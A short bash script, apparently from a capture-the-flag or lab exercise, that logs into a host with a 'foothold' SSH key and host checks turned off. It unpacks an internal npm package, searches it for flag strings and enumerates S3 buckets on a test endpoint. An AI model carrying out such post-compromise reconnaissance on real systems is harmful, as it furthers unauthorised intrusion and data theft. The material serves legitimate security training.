#!/bin/bash
ssh -i ~/.ssh/keplerops-foothold -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p 2222 rowan@10.50.13.180 '
set -x
cd /tmp && rm -rf k02npm && mkdir k02npm && cd k02npm
npm view @keplerops/fieldlink-connector versions --json 2>&1 | tail -20
npm pack @keplerops/fieldlink-connector@7.4.2 2>&1 | tail -5
ls -la
for t in *.tgz; do echo "== $t =="; tar tzf "$t"; mkdir -p x && tar xzf "$t" -C x; done
find x -type f | head -50
grep -r "FLAG{" x 2>/dev/null | head -20
echo ==S3==
aws --endpoint-url https://objects.keplerops.test s3 ls s3://fieldlink-exports 2>&1 | head -20
aws --endpoint-url https://objects.keplerops.test s3 ls s3://fieldlink-exports/build-results/ 2>&1 | head -20
aws --endpoint-url https://objects.keplerops.test s3 ls s3://fieldlink-exports/build-results/BLD-1842/ 2>&1 | head -20
' 2>&1 | tail -80
